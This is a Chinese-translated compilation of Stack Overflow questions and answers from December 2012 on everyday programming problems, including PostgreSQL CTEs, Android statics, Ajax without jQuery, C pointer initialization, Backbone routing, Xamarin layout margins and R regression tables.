只是感兴趣，为什么下面的（简化）示例以这种方式工作。

```
CREATE TABLE test (id SERIAL, val INT NOT NULL, PRIMARY KEY(id));
INSERT INTO test (val) VALUES (1);

WITH t AS ( UPDATE test SET val = 1 RETURNING id ) 
DELETE FROM test WHERE id IN ( SELECT id FROM t); 
```

结果：
**删除 0**

问题：
**为什么 DELETE 没有找到要删除的行？**

PostgreSql 版本 9.2.1
事务隔离 = 读已提交

谢谢！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-10T18:36:39.613

我怀疑它与[文档](http://www.postgresql.org/docs/9.2/static/sql-select.html#SQL-WITH)中的这一行有关-

> 主查询和 WITH 查询都（理论上）同时执行。这意味着 WITH 中的数据修改语句的效果无法从查询的其他部分看到，除非通过读取其 RETURNING 输出。如果两个这样的数据修改语句尝试修改同一行，则结果未指定。

虽然我认为 ID 是可用的，因为它在 WITH 子查询中没有改变，但行可见性可能会发生一些事情。“未指定”一词非常模糊，这可能确实是 postgres 列表的一个问题，因此其中一位大师可以对此有所了解......

编辑：为了提供更多信息，我还尝试用 替换`DELETE`，`SELECT *`这返回了预期的行。我的直接反应是，如果它可以找到返回它们的行，它应该能够找到它们来删除它们。但如果我仔细考虑，这个测试支持引用，因为与非数据修改语句配对的数据修改语句会产生预期的结果，而两个数据修改语句会产生意想不到的结果。

# android - Activity 中的静态内容

> ID：13806715
> 
> 赞同：2
> 
> 时间：2012-12-10T18:14:17.900
> 
> 标签：android, android-activity

为什么我不应该在 Activity 中使用静态对象或不对 Activity 进行静态调用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:23:01.560

更合理的说法是在 Android 中使用静态变量时要格外小心。

您可以使用它们，但请注意您的应用程序可以并且将被操作系统杀死，并在用户返回应用程序时重新启动（即可能来自最近的应用程序列表）。这会导致您的应用程序具有许多不同的入口点，并且您不能假设静态变量将被初始化。

例如，在应用程序的第一个 Activity 中设置一个静态变量，并假设它总是被设置是一个很大的错误。

此外，在将任何引用 Activity 的内容存储为静态变量时要小心，因为这往往是不必要地消耗内存的常见来源。例如，将 a 存储`View`在静态变量中几乎可以肯定是一个错误，因为如果不清除，它将阻止整个 Activity 被垃圾收集。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:18:18.663

避免将不需要的东西设为静态是一种普遍的好习惯，因为它们会增加内存泄漏的机会。如果您总是持有对某些数据的引用，GC 将无法释放它。

# ios - touchesBegan 仅在 768x768 像素矩形内触发

> ID：13806716
> 
> 赞同：0
> 
> 时间：2012-12-10T18:14:17.783
> 
> 标签：ios, touch, ogre

我在模拟器（5.1 和 6.0）和我的设备（运行 iOS6.0 的 iPad2）上看到我的 iPad 应用程序的奇怪行为。无论应用程序从哪个方向开始，`touchesBegan`仅在区域 (0,0) - (767,767) 中的新触摸时触发 - 在纵向模式下，屏幕底部不响应，在右侧横向。但是，`touchesMoved`在`touchesEnded`整个显示器上工作 - 如果我触摸并拖动到“损坏”区域，则会收到触摸释放事件。

我进一步指出，虽然在 iOS *6*模拟器上我的应用程序*看起来*不错，即使它不能正常工作，但在 iOS 5.1 模拟器上，最初的渲染也有点混乱： ![最初从横向开始](../Images/08c1adb6c8639854c6280b7a3c65b922.png) ![最初以纵向开始](../Images/50fd90d6c4e67e04a59e32a86b039aa0.png)

整个显示应该是灰色的，并且右下角带有滑块的框。再一次，768 似乎是这里的神奇值。旋转几次可以解决此渲染问题，但不能解决输入问题...以纵向模式开始并旋转 180 度，现在看起来正确，但顶部停止响应，而不是底部。

这里使用了一个 3rd-partly 库，所以我的主要问题是**什么可能导致这种问题，我应该寻找什么？**我也很好奇为什么两个模拟器给出不同的结果

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T21:35:56.833

如果您是`touchesBegan`、`touchesMoved`，并且`touchesEnded`所有人都在您的 中寻找一个位置`self.view`，那么您可能不在正确的框架区域中以接收触摸。我刚刚遇到了类似的问题，我使用以下方法明确更改了框架的大小：

```
self.view.frame = CGRectMake(0,0,1024,1536); 
```

因为我的游戏有两个屏幕高。重新调整框架大小后，`touchesBegan`工作正常。希望这会有所帮助！

# javascript - 没有 jQuery 的 Ajax

> ID：13806719
> 
> 赞同：1
> 
> 时间：2012-12-10T18:14:47.527
> 
> 标签：javascript, ajax

> **可能重复：**
> [如何在没有 jquery 的情况下进行 ajax 调用？](https://stackoverflow.com/questions/8567114/how-to-make-an-ajax-call-without-jquery)

我在 js(Ajax) 中有代码，但我想在没有 Ajax(XMLHttpRequest) 的情况下制作它

```
$.ajax({
            type:'POST',
            data:'slug='+prize,
            url:'/wybrana-nagroda/',
            success:function(msg)
            {
                $('#whaiting').hide();
                if(msg==='winner') 
                    $(window.location).attr('href','/formularz');
            }
        }); 
```

它应该是什么样子？

```
function send(post, url) {
  var client = new XMLHttpRequest();
  client.open("POST", url);
  client.send(message);
} 
```

?

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:17:40.277

如果您希望它在所有浏览器上兼容，则需要执行以下操作：

```
function sendRequest(url,callback,postData) {
    var req = createXMLHTTPObject();
    if (!req) return;
    var method = (postData) ? "POST" : "GET";
    req.open(method,url,true);
    req.setRequestHeader('User-Agent','XMLHTTP/1.0');
    if (postData)
        req.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    req.onreadystatechange = function () {
        if (req.readyState != 4) return;
        if (req.status != 200 && req.status != 304) {
//          alert('HTTP error ' + req.status);
            return;
        }
        callback(req);
    }
    if (req.readyState == 4) return;
    req.send(postData);
}

var XMLHttpFactories = [
    function () {return new XMLHttpRequest()},
    function () {return new ActiveXObject("Msxml2.XMLHTTP")},
    function () {return new ActiveXObject("Msxml3.XMLHTTP")},
    function () {return new ActiveXObject("Microsoft.XMLHTTP")}
];

function createXMLHTTPObject() {
    var xmlhttp = false;
    for (var i=0;i<XMLHttpFactories.length;i++) {
        try {
            xmlhttp = XMLHttpFactories[i]();
        }
        catch (e) {
            continue;
        }
        break;
    }
    return xmlhttp;
} 
```

信用：[怪癖模式](http://www.quirksmode.org/js/xmlhttp.html)

# mysql - 用mysql查询两张表，按小时统计主题总数

> ID：13806726
> 
> 赞同：0
> 
> 时间：2012-12-10T18:15:17.797
> 
> 标签：mysql

我的论坛有两个表来存储主题（posts 和 forums_archive_posts）

```
$this->DB->build( array(
                                    'select'    => "HOUR( FROM_UNIXTIME( post_date ) ) as hour, COUNT(*) AS postCount",
                                    'from'      => 'posts',
                                    'where'     => "new_topic=0 AND author_id=" . $member['member_id'],
                                    'group'     => 'HOUR( FROM_UNIXTIME( post_date ) )',
                        )       ); 
```

此查询仅适用于第一个表（帖子），我需要一个也适用于“forum_archive_posts”的查询

**表结构**（forum_archive_posts=posts）：

archive_author_id = author_id

archive_content_date = post_date

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:26:17.100

不知道你是如何以这种格式做的，但类似

```
Select postHour, sum(postcount) as postCount From
(
  select Hour ...  as PostHour
  From 
  Posts...
  Union
  Select Hour ...
  From
  ForumArchivePosts ...
) dummyTableName
Group by PostHour 
```

应该做的工作。从两个表中计算 bny hoiurs，然后将它们加在一起。

# c - 初始化错误

> ID：13806728
> 
> 赞同：-1
> 
> 时间：2012-12-10T18:15:21.173
> 
> 标签：c, pointers, initialization

任何人都知道为什么会这样：

```
int main(void)
{
char action;
int *i;
*i=10;
printf("%d",*i);
action='C';
printf("%c",action);
} 
```

但这不是

```
int main(void)
{
char action='C';
int *i;
*i=10;
printf("%d",*i);
printf("%c",action);
} 
```

我没有收到任何错误，但它不会运行！不明白为什么那一点点差异会导致它崩溃

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:17:11.797

您的代码的行为未定义。它的行为没有逻辑。它本质上是随机的。试图分析为什么一些不相关的“微小差异”会改变你在实验中观察到的行为是浪费时间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:29:37.763

正如其他答案所示，您的两个程序都同样错误。

有很多方法可以使它正确。这里有2种方法。

1.  ```
    int *i;
    int j;
    i = &j;
    *i = 10; 
    ```

2.  ```
    int * i = malloc(sizeof(int));
    *i = 10;

    // After you are done with i

    free(i); 
    ```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T18:19:55.880

是`undefined bahavior`。您已经创建了一个指针，并且没有初始化指针，而是直接将值放入`10`由指针指向的内存位置`i`where `i`has `indeterminate value`。因此，在这种情况下，它将将该值放入该`10`垃圾值位置（指针的值`i`）。因此，如果垃圾值位置可访问，它可能会执行，或者如果内存位置不可访问，它可能会崩溃。

因此它只是`undefined bahavior`

# java - PrintWriter 没有打印出完整的字符串

> ID：13806733
> 
> 赞同：6
> 
> 时间：2012-12-10T18:15:37.940
> 
> 标签：java, string, io, filewriter, printwriter

我有以下代码

```
FileWriter F = new FileWriter("out.txt");
PrintWriter H = new PrintWriter(F);
H.print(split[split.length - 2]);
H.print("END"); 
```

但是，当我检查 txt 时，最后一个文本不是“END”，而是字符串中单词的一部分。这是“repa”

当我这样做时

```
FileWriter F = new FileWriter("out.txt");
PrintWriter H = new PrintWriter(F);
System.out.print(split[split.length - 2]); 
```

我得到的最后一段文字是数字“49”——这是正确的。

看来 PrintWriter 没有完全写出字符串。但是，当我这样做时

```
FileWriter F = new FileWriter("out.txt");
PrintWriter H = new PrintWriter(F);
H.print(split[split.length - 2]);
H.println(pdfInText)://Another string
H.print("END"); 
```

“原始”文本现在实际上完成了 - 这是什么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-10T18:41:27.480

你关闭了`PrintWriter`吗？从它的javadoc

> 与 PrintStream 类不同，如果启用了自动刷新，它将仅在调用 println() 方法之一时完成，而不是在碰巧输出换行符时完成。println() 方法使用平台自己的行分隔符概念，而不是换行符。

如果您确实关闭了`PrintWriter`（而不是 FileWriter！）`flush()`，请在打印后尝试强制执行。

# javascript - 多页面js应用的集中代码

> ID：13806737
> 
> 赞同：2
> 
> 时间：2012-12-10T18:15:46.130
> 
> 标签：javascript, model-view-controller, backbone.js, multipage

我正在清理一个包含 65 个以上 html 页面和一个中央 javascript 库的多页面应用程序。我的 html 页面有大量冗余，而中央 js 库已成为意大利面条。我面临合并页面的限制，因为我在一个更大的框架内工作，该框架强制执行某种结构。我想减少冗余并清理代码。

我发现了主干、MVC 模式、微模板和 requirejs，但它们似乎最适合单页应用程序。不知何故，我需要让主模块知道正在加载哪个页面，以便它将正确的元素放在页面上。我正在考虑传入 html 的标题，这将获取正确的页面元素集合并将它们作为对象传递给 App.initialize。

1）任何人都可以验证这种方法吗？如果没有，是否有推荐的替代方法？像木偶这样的骨干扩展怎么样？

2）任何人都可以推荐一种将页面细节放入主干框架的方法吗？

按照主干教程，我使用调用 view.render 方法的 App.initialize 方法的 main.js 构建了一个成功的测试页面。我的第一个想法是阅读 html 页面标题并使用它为正在加载的特定页面选择模型。我必须传入一个包含每个页面布局细节的对象。这是视图的渲染方法，因此您可以看到我要执行的操作：

```
 render: function () {  // pass parameter to render function here?
            var data = new InputModel,
                pageTitle = data.pageTitle || data.defaults.pageTitle,
                compiled,
                template;

            var pageElements = [
                { container: '#page_title_container', template: '#input_title_template' },
                { container: '#behavior_controls_container', template: '#behavior_controls_template' },
                { container: '#occurred_date_time_container', template: '#date_time_template' }]

            for (var i = 0; i < pageElements.length; i++) {
                this.el = pageElements[i].container;
                compiled = _.template($(InputPageTemplates).filter(pageElements[i].template).html());
                template = compiled({ pageTitle: pageTitle });  
                //pass in object with values for the template and plug in here?
                $(this.el).html(template);
            }
        } 
```

对你的帮助表示感谢。我在更新大约 1999 年的 JavaScript 技能时获得了很多乐趣。语言发生了很多很酷的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T21:06:19.817

使用文档标题来选择加载的脚本听起来有点杂乱无章。但是，如果它有效，那就去吧。

另一个值得探索的想法可能是使用[Backbone.Router](http://backbonejs.org/#Router)来`pushState:true`设置正确的页面。当您`Backbone.history.start()`在启动时调用时，路由器会点击与您当前 url 匹配的路由，即您所在的页面。

在路由回调中，您可以执行所有特定于页面的初始化。

您可以将模板和容器选择从视图移到路由器中，并在`initialize()`函数中设置视图（视图的构造函数）。说，类似：

```
//view
var PageView = Backbone.View.extend({
    initialize: function(options) {
        this.model = options.model;
        this.el = options.el;
        this.title = options.title;
        this.template = _.template($(options.containerSelector));
    },

    render: function() { 
        window.document.title = title;
        var html = this.template(this.model.toJSON());
        this.$el.html(html);
    }
}); 
```

在路由器级别处理视图选择：

```
//router
var PageRouter = Backbone.Router.extend({
    routes: {
        "some/url/:id": "somePage",
        "other/url":    "otherPage"
    },

    _createView: function(model, title, container, template) { 
        var view = new PageView({
            model:model,
            title:title
            el:container,
            templateSelector:template,
        });
        view.render();
    },

    somePage: function(id) { 

        var model = new SomeModel({id:id});
        this._createView(model, "Some page", "#somecontainer", "#sometemplate");
    },

    otherPage: function() {
        var model = new OtherModel();
        this._createView(model, "Other page", "#othercontainer", "#othertemplate");
    }
}); 
```

并使用启动应用程序`Backbone.history.start()`

```
//start app
$(function() {
    var router = new PageRouter();
    Backbone.history.start({pushState:true});
} 
```

在这种解决方案中，视图代码不需要知道其他视图的具体代码，如果您需要为某些页面创建更专业的视图类，您不需要修改原始代码。

乍一看，这似乎是一个干净的解决方案。当路由器想要开始捕获路由并且您希望浏览器正常导航离开页面时，当然可能会出现一些问题。如果这会导致严重的问题，或者导致比基于标题的解决方案更大的混乱，那么原始解决方案可能仍然是可取的。

（未经测试的代码示例）

# iis-7 - 如何确定 IIS 是否正常工作？

> ID：13806738
> 
> 赞同：-2
> 
> 时间：2012-12-10T18:15:48.910
> 
> 标签：iis-7

我们在一台机器上托管了几个站点，如果我想知道天气 IIS 在我的机器上是否在该系统中工作而无需登录该机器，我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:18:55.450

您可以使用服务器监控软件或看门狗服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:27:25.960

您还可以为此使用 PowerShell 脚本

```
$serverName = 'MACHINE NAME';
$iis = get-wmiobject Win32_Service -ComputerName $serverName -Filter "name='IISADMIN'"

if($iis.State -eq "Running")
{Write-Host "IIS is running"}

else 
{ Write-Host "IIS is not running"} 
```

见[源](http://briangordon.wordpress.com/2010/10/27/powershell-check-if-iis-is-running-on-a-remote-server/)

# javascript - 向 DOM 添加新内容后多次运行的事件

> ID：13806741
> 
> 赞同：0
> 
> 时间：2012-12-10T18:16:12.823
> 
> 标签：javascript, jquery, ajax, plugins

我的插件有问题，因为如果将新元素添加到 DOM，我需要一种更新方法 我添加了更新方法，如果我启动插件一切顺利，一切正常，没有问题，没有错误，但是一旦我向 DOM 添加一个新的 elelemnt（带类框的 div） 事情出错了，更新有效，但点击事件现在似乎触发了多次，所以如果我添加一个新元素，事件运行两次，如果我添加 2 个元素DOM，事件运行 3 次....等等。我不太擅长 Js，所以我被困在这个问题上，我尝试了很多，但似乎没有任何效果。

新添加的元素可以正常工作，但如果我添加更多新元素，它们也会遇到同样的问题。

我在一个小预览下面添加了，因为我的插件是自定义的，所以我只发布了有问题的部分（使它们易于理解）。

**需要更新方法，需要更新新元素（.box）（将新代码添加到.box）**

HTML 代码

```
 <div id="container">

  <div class="box">
      <a href="#" class="link1">link 1</a>
      <a href="#" class="link1">link 2</a>
      <div>content goes here...</div>
  </div>

  <div class="box">
      <a href="#" class="link1">link 1</a>
      <a href="#" class="link1">link 2</a>
      <div>content goes here...</div>
  </div>

  <div class="box">
      <a href="#" class="link1">link 1</a>
      <a href="#" class="link1">link 2</a>
      <div>content goes here...</div>
  </div>
</div> 
```

内联脚本

```
 $('#container').myplugin01();

  $('#somelink').click(function(e){
      $('#container').append('<div class="box"><a href="#" class="link1">link 1</a><a href="#" class="link1">link 2</a><div>content goes here...</div></div>'); 

      $('#container').myplugin01('update');
  }); 
```

插件

```
 ;(function($, window, document, undefined){

      //"use strict"; // jshint ;_;

      var pluginName = 'myplugin01';

      var Plugin = function(element, options){
          this.init(element, options);
      };

      Plugin.prototype = {

          init: function(element, options){

              this.elm     = $(element);
              this.options = $.extend({}, $.fn[pluginName].options, options);

              // example 1: animation
              $('#container').children('.box').on("click", ".link1", function(e){
                  $(this).parent().children('div').animate({height: 'toggle'},400)
              });

              // example 2: wrapping
              $('#container').children('.box').on("click", ".link2", function(e){
                  $(this).parent().wrap('<div class="wrapped"></div>')
              });

              this.update();
          },

          update: function(){
              $('#container').children('.box').addClass('someclass');

              // more code here...
          }
      };

      $.fn[pluginName] = function(option) {
          var options = typeof option == "object" && option;

          return this.each(function() {
              var $this = $(this);
              var data  = new Plugin($this, options);

              if(!$.data($this, pluginName)){           
                  $.data($this, pluginName, data);
              }

              if(typeof option == 'string'){
                  data[option]();
              }

          });
      };

      /**
      * Default settings(dont change).
      * You can globally override these options
      * by using $.fn.pluginName.key = 'value';
      **/
      $.fn[pluginName].options = {
          name: 'world' 
      };

  })(jQuery, window, document); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:21:10.883

如果您多次绑定事件，则会出现此问题。

```
 // inline script
  $('#container').myplugin01();// binding first time

  $('#somelink').click(function(e){
      $('#container').append('<div class="box"><a href="#" class="link1">link 1</a><a href="#" class="link1">link 2</a><div>content goes here...</div></div>'); 

      $('#container').myplugin01('update');// binding second time
   // We suggest you to unbind here and rebind it.

  }); 
```

# module - 在错误位置查找模块的代码

> ID：13806747
> 
> 赞同：2
> 
> 时间：2012-12-10T18:16:22.230
> 
> 标签：module, dojo, amd

我使用 build.dojotoolkit.org（我的第一次尝试）创建了一个具有 3 层的多层构建：dojo.js、dojox.js、dijit.js。每个 js 文件都上传到自己的文件夹中（dojo、dojox、dijit）。

当我运行代码时，我希望它在 dijit.js 中查找以获取像 dijit.form.TextBox 这样的表单模块。但相反，它会尝试加载 dijit/form/TextBox.js，当然最终会出现 404 错误。

我究竟做错了什么？

如果有帮助，文件就在这里：http: [//usermanagedsolutions.com/Demos/Pages](http://usermanagedsolutions.com/Demos/Pages)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T20:03:29.720

手动将每个图层包含在页面上的脚本标记中。

```
<script src="path/to/dojo.js" />
<script src="path/to/dojox.js" />
<script src="path/to/dijit.js" /> 
```

这将使您在构建中定义的所有模块可用。当您需要该文本框时，Dojo 将看到它有代码并且不会进行 XHR 调用。

即使您不打算使用单个文件，您也可能希望将它们放在服务器上。这样，如果有人忘记将文件添加到构建中，则产生的惩罚是 xhr 请求，而不是 javascript 错误。

* * *

回复：AMD

当您以我上面描述的方式包含层时，您并没有加载包含构建的所有模块 - 您只是使定义函数可用，而无需发出 xhr 请求。

如果您查看构建输出的 js 文件，该文件包含模块路径到函数的映射，该函数在调用时将定义模块。

所以当你写下面的代码

```
require(["dijit/form/TextBox"], function(TextBox){
  ...
}); 
```

AMD 将首先确定是否`dijit/form/TextBox`已经定义。如果是这样，它将只获取对象并执行回调。

如果模块尚未定义，则 AMD 将在其缓存中查看定义代码是否可用。当您包含脚本文件时，您将提供定义函数的缓存。AMD 找到定义模块的代码。它调用这个定义函数，结果是传递给回调的对象。后续的要求`dijit/form/TextBox`也将如上所述使用此对象。

如果模块尚未定义且 AMD 未在其缓存中找到定义函数，则 AMD 将向服务器发出 XHR 请求以尝试定位特定模块代码。XHR 调用的结果应该提供定义函数。AMD 将调用该函数并将结果作为对象传递给回调。同样，后续的 requires`dijit/form/TextBox`也将使用此对象。

Dojo 构建提供了 1) 缩小代码和 2) 将其组合成需要从服务器请求的更少文件的能力。

AMD 允许您编写可在任一环境（使用构建文件或单个文件）中运行的代码，而无需进行修改。

# c# - 如何在 MonoDroid 的代码隐藏中设置边距？

> ID：13806750
> 
> 赞同：1
> 
> 时间：2012-12-10T18:16:34.530
> 
> 标签：c#, android, android-layout, xamarin.android, xamarin

这个问题很简单，但我什么也没找到。如何在代码隐藏中将边距设置到小部件中。

[我在Xamarin 的网站上](http://androidapi.xamarin.com/?link=M%3aAndroid.Views.ViewGroup%2bMarginLayoutParams.SetMargins%28System.Int32,System.Int32,System.Int32,System.Int32%29)找到了这个文档，但我不能在 ImageView 中使用它

我也在我的 ImageView 中尝试了 Layout() 方法，但它不起作用。

```
 ImageView imgView = FindViewById<ImageView>(Resource.Id.imageView);
        imgView.Layout(10, 10, 10, 10); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T12:35:42.400

你试过使用 FrameLayout 的 LayoutParams 吗？

这是一个例子：

你的形象：

```
ImageView imgView = FindViewById<ImageView>(Resource.Id.imageView); 
```

您的图像参数：

```
FrameLayout.LayoutParams imgViewParams = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.WrapContent, FrameLayout.LayoutParams.WrapContent, 0.0f);
imgViewParams.SetMargins(10, 10, 10, 10); 
```

设置图像的参数：

```
imgView.LayoutParameters = imgViewParams; 
```

编辑：将**LinearLayout** .LayoutParameters 更改为**FrameLayout** .LayoutParameters！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T13:52:44.197

你可以在你的布局中添加一个 LinearLayout 吗？

您可以将 ImageView 包裹在其中并添加边距！

像这样：

```
<LinearLayout 
    android:orientation="horizontal"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_margin="10dp" >
    <ImageView
        your imageview stuff />
</LinearLayout> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-11T18:21:16.117

不知道这是否有帮助，但您可以尝试像这样更改边距值，看看效果如何：

```
imgView.margin = new thickness(leftvalue,topvalue,rightvalue,botvalue); 
```

# c# - 为什么 Office 互操作参考在 VS 2010 中显示错误

> ID：13806758
> 
> 赞同：1
> 
> 时间：2012-12-10T18:17:00.593
> 
> 标签：c#, visual-studio-2010, visual-studio

我使用以前的 VS 创建了一个解决方案，现在我在 VS 2010 中打开了这个解决方案，这个参考似乎不正确：

![在此处输入图像描述](../Images/177860d6a0f46b02f60cbc14ed85c3fe.png)

之前还好，这几个月程序每天都运行良好；那么为什么VS 2010会告诉我这个？

在解决方案资源管理器中，参考似乎有问题。以前很好：

![在此处输入图像描述](../Images/b07da1d95b97626d6f9d67c941f6c353.png)

好的 - 我刚刚删除了上面的参考，然后找到了这个构建（**看起来完全一样**）并添加了它，现在世界上一切看起来都很好！

![在此处输入图像描述](../Images/4e522334b5a849accbade40e2d0582ed.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:18:58.820

您是否引用了 office dll 以及仅添加了 using 语句。或者如果它一直运行良好，是缺少 DLL 还是删除了引用。最可能的原因是 DLL 位于开发它的机器的 GAC 中，而不是当前的机器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:20:31.470

这可能是因为当前版本的 VS 没有加载正确的 dll。所以如果我是你，我会看看如何启用一些你需要的参考。我不知道您如何启用它们，或者您必须启用哪些。但我知道我以前遇到过这个问题，它解决了我的问题。只需谷歌错误，您可能会找到解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T09:40:46.747

我最近安装了新的，`VS`因此我相信它也安装了最新版本的`.NET framework`. 所以我怀疑当我打开这个项目时，它指向的是一个更新的框架版本，它导致了参考问题。

我删除了损坏的引用并将其重新添加，现在看起来很好。

# ios - AFNetworking HTTP 代理

> ID：13806763
> 
> 赞同：5
> 
> 时间：2012-12-10T18:17:31.917
> 
> 标签：ios, proxy, afnetworking

我在使用 AFNetworking 和 HTTP 代理设置时遇到了一些问题。由于 AFNetworking 是基于 NSURLConnection 构建的，它是否具有对 iPad / iPhone wifi 设置中添加的 HTTP 代理的内置支持？或者我是否必须在构建我的 URL 以支持代理时以编程方式执行某些操作？

谢谢，
泰加

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-21T15:34:01.190

AFNetworking / iOS 7 更新：如果您使用 *session 而不是 *requestoperation 接口，您可以使用[`[NSURLSessionConfiguration -connectionProxyDictionary]`](https://developer.apple.com/library/ios/documentation/Foundation/Reference/NSURLSessionConfiguration_class/Reference/Reference.html#//apple_ref/occ/instp/NSURLSessionConfiguration/).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-12T14:24:49.730

因此，似乎 NSURLConnection / AFNetworking 只支持开箱即用的 HTTP 基本身份验证。如果代理使用 NTLM 身份验证，则在 wifi 设置中设置身份验证适用于 Safari，但不适用于任何其他应用。（测试 Foursquare、Facebook 等）。但是，当您第一次启动 Safari 时，即使您在 iPad 上的 wifi 设置中指定了用户名/密码，您也会收到一个弹出窗口，要求您输入用户名/密码。在此处输入它们后，Safari 一切正常。

作为 iOS5 的一部分提供的 NSURLRequest 委托方法应该在代理发出身份验证质询时被调用。但是这些再也没有被调用过。不确定这是错误行为还是我设置不正确。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-12T02:23:14.613

由于它是基于 构建的`NSURLConnection`，因此它可以正常工作。[您可以使用Charles Proxy](http://www.charlesproxy.com/)轻松尝试。

# php - javascript中的PHP代码

> ID：13806768
> 
> 赞同：1
> 
> 时间：2012-12-10T18:17:39.683
> 
> 标签：php, javascript, google-maps-api-3

我想看看如何将 $CITY、$STATE 和 $count 数据包含在 javascript 代码中？

这是非工作代码：

```
<?php echo('<script type="text/javascript"> var address$count = $CITY$STATE');?>

   var map = new google.maps.Map(document.getElementById('map'), { 
       mapTypeId: google.maps.MapTypeId.TERRAIN,
       zoom: 6
   });

   var geocoder = new google.maps.Geocoder();

   geocoder.geocode({'address': address<?php echo($count);?>},

   function(results, status) {
      if(status == google.maps.GeocoderStatus.OK) {
         new google.maps.Marker({
            position: results[0].geometry.location,
            map: map
         });
         map.setCenter(results[0].geometry.location);
      }
   });

   </script> 
<?php
}
?>
</body> 
</html> 
```

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:20:40.230

尝试：

```
<?php echo "<script type='text/javascript'> var address".$count." = "".$CITY." ".$STATE."";" ;?>

   var map = new google.maps.Map(document.getElementById('map'), { 
       mapTypeId: google.maps.MapTypeId.TERRAIN,
       zoom: 6
   });

   var geocoder = new google.maps.Geocoder();

   geocoder.geocode({'address': address<?php echo($count);?>},

   function(results, status) {
      if(status == google.maps.GeocoderStatus.OK) {
         new google.maps.Marker({
            position: results[0].geometry.location,
            map: map
         });
         map.setCenter(results[0].geometry.location);
      }
   });

   </script> 
<?php
}
?>
</body> 
</html> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:21:00.713

如果您的变量是正确的，javascript 通常需要在字符串周围加上引号，如下所示：

```
<?php 
 echo '<script type="text/javascript"> var address'.$count.' = "'.$CITY.$STATE.'"';
?> 
```

此外，在字符串中使用 PHP 变量需要双引号，因此如果您打算保留单引号，则需要集中。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-10T18:22:56.780

尝试这个：

```
<?php echo('
   <script type="text/javascript"> var address' . $count . '= "' . $CITY . $STATE . '"'
);?> 
```

# r - R 中稳健回归的回归表

> ID：13806770
> 
> 赞同：2
> 
> 时间：2012-12-10T18:17:41.143
> 
> 标签：r, formatting, regression, pretty-print

我已经成功使用`memisc`包中的 mtable 到漂亮的打印结果（APSR 样式）并排几个回归，但是我无法让相同的命令适用`lrm()`于`MASS`包中适合的模型和`lmrob()`从`robustbase`包中。

效果很好：

```
lm0 <- lm(sr ~ pop15 + pop75,              data = LifeCycleSavings)
lm1 <- lm(sr ~                 dpi + ddpi, data = LifeCycleSavings)
lm2 <- lm(sr ~ pop15 + pop75 + dpi + ddpi, data = LifeCycleSavings)

mtable123 <- mtable("Model 1"=lm0,"Model 2"=lm1,"Model 3"=lm2) 
```

`mtable()`命令失败`("Error in qt(p, df, lower.tail, log.p): Non-numeric argument to mathematical function")`：

```
rlm0 <- rlm(sr ~ pop15 + pop75,              data = LifeCycleSavings)
rlm1 <- rlm(sr ~                 dpi + ddpi, data = LifeCycleSavings)
rlm2 <- rlm(sr ~ pop15 + pop75 + dpi + ddpi, data = LifeCycleSavings)

mtable123 <- mtable("Model 1"=rlm0, "Model 2"=rlm1, "Model 3"=rlm2) 
```

`mtable()`在命令 ( `"Error in UseMethod("getSummary"): no applicable method for 'getSummary' applied to an object of class "lmrob""`)处失败：

```
lmrob0 <- lmrob(sr ~ pop15 + pop75,              data = LifeCycleSavings)
lmrob1 <- lmrob(sr ~                 dpi + ddpi, data = LifeCycleSavings)
lmrob2 <- lmrob(sr ~ pop15 + pop75 + dpi + ddpi, data = LifeCycleSavings)

mtable123 <- mtable("Model 1"=lmrob0, "Model 2"=lmrob1, "Model 3"=lmrob2) 
```

我愿意接受不涉及 mtable 的建议，但我正在寻找纯文本或制表符分隔的输出（换句话说，不是 LaTeX）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T19:54:37.567

**memisc**`?getSummary`包中的文档描述了如何扩展该函数以用于其他模型类型。**`mtable`**

 **特别是，您需要创建一个适当的方法`getSummary`，然后使用`setSummaryTemplate`. 因此，例如，这样的事情有效：

```
getSummary.rlm <- function(obj, alpha = 0.5,...){
    obj_summary <- summary(obj)

    coefficients <- cbind(coef(obj_summary),dt(coefficients[,3],df = obj_summary$df))
    #You can add the CI code yourself, this is a placeholder:
    coefficients <- cbind(coefficients,matrix(NA,nrow(coefficients),2))
    colnames(coefficients) <- c('est','se','stat','p','lwr','upr')

    sumstat <- c(sigma = obj_summary$sigma,df = obj_summary$df[2],stddev = obj_summary$stddev)

    return(list(coef = coefficients,sumstat = sumstat))
}

setSummaryTemplate(rlm = c(sigma = "($sigma:#)",df = "($df:#)",stddev = "($stddev:#)"))

mtable123 <- mtable("Model 1"=rlm0,"Model 2"=rlm1,"Model 3"=rlm2)
